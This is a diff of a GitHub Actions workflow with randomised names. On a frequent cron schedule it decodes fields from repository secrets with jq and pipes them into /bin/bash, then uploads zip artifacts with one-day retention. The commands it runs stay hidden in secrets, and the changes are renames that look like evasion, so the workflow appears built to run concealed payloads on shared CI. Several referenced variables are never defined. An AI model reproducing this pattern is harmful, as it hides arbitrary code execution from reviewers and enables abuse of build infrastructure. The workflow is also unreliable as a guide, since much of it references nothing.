@@ -1,31 +1,30 @@
 name: wanghuangtaofu
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '51 2/6 * * *'
-jobs:  # 5295
+    - cron: '27 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wanghuangtaofu
         env:
-          fbkbz1310: ${{ secrets.fbkbz1310 }}
+          troxn349: ${{ secrets.troxn349 }}
         run: |
-          echo $fbkbz1310 | jq -r .ymc0349 | /bin/bash
-          echo $ez1000 | jq -r .njs49 | /bin/bash
-          echo $odiy78554 | jq -r .invm2687 | /bin/bash
-          echo $a949 | jq -r .mz60178 | /bin/bash
-          echo $sv2 | jq -r .vcmz0248 | /bin/bash
-          echo $xsxnj8 | jq -r .lkpa07141 | /bin/bash
-          echo $j25019 | jq -r .ffhj7 | /bin/bash
-          echo $jcjza3 | jq -r .v1 | /bin/bash
-          echo $mmt61 | jq -r .wj4296 | /bin/bash
-          echo $vjy520 | jq -r .pfzy8 | /bin/bash
-          echo $cut07 | jq -r .k3824 | /bin/bash
-          echo $ahzum7049 | jq -r .d9623 | /bin/bash
-          echo $sqq9348 | jq -r .druw7 | /bin/bash
-          echo $rqfwr56 | jq -r .xhwsw70511 | /bin/bash
+          printf '%s' "$troxn349" | jq -r .repjk1991 | /bin/bash
+          printf '%s' "$chkrb8723" | jq -r .a3 | /bin/bash
+          echo $w7838 | jq -r .s31360 | /bin/bash
+          printf '%s' "$zbudf32" | jq -r .vyo8 | /bin/bash
+          printf '%s' "$rc25" | jq -r .pm19 | /bin/bash
+          echo $culci9 | jq -r .farih016 | /bin/bash
+          echo $j74 | jq -r .lmdiy35 | /bin/bash
+          printf '%s' "$sl86" | jq -r .td2015 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: IfKlp73l
+          path: "*.zip"
+          retention-days: 1
